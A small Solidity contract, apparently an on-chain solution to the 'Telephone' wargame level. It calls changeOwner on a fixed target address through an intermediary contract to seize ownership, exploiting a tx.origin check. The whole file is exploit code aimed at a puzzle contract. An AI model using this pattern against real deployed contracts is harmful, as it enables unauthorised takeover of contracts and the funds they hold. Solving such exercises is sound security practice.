/**
 *Submitted for verification at Etherscan.io on 2021-09-11
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract TelephoneInterface {
    function changeOwner(address _owner) public {}
}

contract TelephoneHack {
    TelephoneInterface public telephoneInterface = TelephoneInterface(0x85922f4931D14Ac2192a6441af74bB2bE0F946aE);
    
    function hack(address _owner) public {
        telephoneInterface.changeOwner(_owner);
    }
}